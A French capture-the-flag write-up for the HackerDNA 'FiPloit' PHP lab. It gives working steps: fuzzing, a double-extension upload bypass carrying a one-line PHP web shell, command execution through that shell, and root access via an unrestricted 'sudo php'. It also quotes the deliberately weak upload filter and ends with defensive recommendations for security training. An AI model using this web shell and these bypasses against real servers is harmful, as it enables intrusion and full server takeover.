# Write-Up : FiPloit

**Plateforme :** HackerDNA  (https://hackerdna.com/fr/labs/fiploit)

**Catégorie :** Web Security - File Operations  
**Difficulté :** Facile  
**Tags :** `LFI` `File Upload Bypass` `PHP Security` `RCE` `PrivEsc`

---

## Scénario

Une application web PHP de développement présente des faiblesses 
critiques dans la gestion des fichiers. L'objectif : transformer 
une fonctionnalité d'upload anodine en compromission totale du 
serveur (RCE → Root).

---

## Chaîne d'Attaque
[Fuzzing] → [notes.txt] → [Upload Bypass] → [RCE] → [PrivEsc] → 🚩

---

## Étape 1 — Reconnaissance

### Scan de ports
Le port 80 ne révèle rien d'intéressant.
Le port **8080** (environnement dev) expose une application PHP.

```bash
nmap -p 80,8080 <IP>
```

### Fuzzing de répertoires
```bash
ffuf -u http://<IP>:8080/FUZZ \
  -w common.txt \
  -e .php,.txt,.log \
  -fs 0
```

**Découverte clé :** `notes.txt` à la racine.

```bash
curl http://<IP>:8080/notes.txt
```

**Contenu :** chemin vers une page d'upload temporaire non 
protégée `upload_log_temp4.php` et des identifiants de BDD.

>  **Réflexe audit :** Les fichiers `.txt`, `.bak`, `.old` 
> sont souvent oubliés en prod. Toujours les chercher en premier.

---

## Étape 2 — File Upload Bypass

### Analyse du filtre
Le code PHP vérifie uniquement la **présence** de la chaîne 
`.txt` dans le nom de fichier — pas l'extension finale.

```php
// Filtre vulnérable (simplifié)
if (strpos($_FILES['file']['name'], '.txt') !== false) {
    // autorisé
}
```

### Exploitation : Double Extension
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.txt.php

curl -F "file=@shell.txt.php" \
  http://<IP>:8080/upload_log_temp4.php
```

Le fichier est uploadé dans `/uploads/` et **interprété par PHP**.

> **Pattern à retenir :** Face à un filtre d'upload, 
> toujours tester `file.txt.php`, `file.php.jpg`, 
> `file.php%00.txt`.

---

## Étape 3 — Remote Code Execution (RCE)

```bash
# Vérification
curl "http://<IP>:8080/uploads/shell.txt.php?cmd=id"
# → uid=33(www-data)

# Flag user
curl "http://<IP>:8080/uploads/shell.txt.php?\
cmd=cat+/home/ctf/flag-user.txt"
```

🚩 **Flag User :** `FLAG{...}`

---

## Étape 4 — Privilege Escalation

### Vérification sudo
```bash
sudo -l
```

**Résultat :**
(ALL) NOPASSWD: /usr/bin/php

### Exploitation via GTFOBins
```bash
sudo php -r 'echo file_get_contents("/root/flag-root.txt");'
```

🚩 **Flag Root :** `FLAG{...}`

>  **Réflexe audit :** `sudo -l` est la **première commande** 
> à taper après obtention d'un shell. PHP/Python/Perl en sudo 
> sans restriction = Root immédiat garanti.

---

## Analyse GRC — Recommandations

| Risque | Impact | Recommandation |
|--------|--------|----------------|
| `notes.txt` exposé | Fuite de surface d'attaque | Supprimer les fichiers debug en prod |
| Upload sans validation stricte | RCE, compromission totale | Liste blanche d'extensions + renommage |
| sudo PHP sans restriction | Escalade Root | Principe du moindre privilège (PoLP) |
| Port 8080 public | Exposition service non durci | Firewall : fermer les ports dev |

| Risque              | CWE        |
|---------------------|------------|
| File Upload Bypass  | CWE-434    |
| Information Leakage | CWE-200    |
| Sudo Misconfiguration | CWE-269  |
| Dev Port exposé     | CWE-16     |

---

## Leçons Apprises

- **L'instinct du port :** 80 est la façade. 8080 cache le dev.
- **La paranoïa des notes :** `.txt`, `.bak`, `.old` = trésors.
- **Le réflexe sudo :** Toujours en premier sur un nouveau shell.
- **Double extension :** Le bypass universel des filtres naïfs.
- **Validation d'entrée :** `strpos('.txt')` ≠ validation 
  d'extension. Utiliser une liste blanche stricte ou `pathinfo()`.

